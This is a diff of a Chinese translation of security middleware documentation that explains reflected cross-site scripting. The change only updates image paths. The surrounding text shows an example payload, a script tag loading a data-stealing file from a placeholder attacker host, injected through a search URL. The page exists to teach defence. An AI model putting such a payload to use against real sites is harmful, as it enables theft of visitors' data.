@@ -20,7 +20,7 @@ XSS是一个千面兽，篇幅所限我们不会介绍所有内容。把握重�
 
 页面可能像下面这样：
 
-![image](/images/xss-filter-ok.png)
+![image](/helmet-docs-zh-CN/images/xss-filter-ok.png)
 
 那么如果我们搜索的是`<script src="http://evil.example.com/steal-data.js"></script>`会发生什么情况呢？URL可能会显示成下面这样：
 
@@ -30,7 +30,7 @@ https://goober.example.com/search?query=<script%20src="http://evil.example.com/s
 
 然后你的页面会出现什么呢：
 
-![image](/images/xss-filter-malicious.png)
+![image](/helmet-docs-zh-CN/images/xss-filter-malicious.png)
 
 瞧，恶意JavaScript文件就这样执行了，就很烦。
 
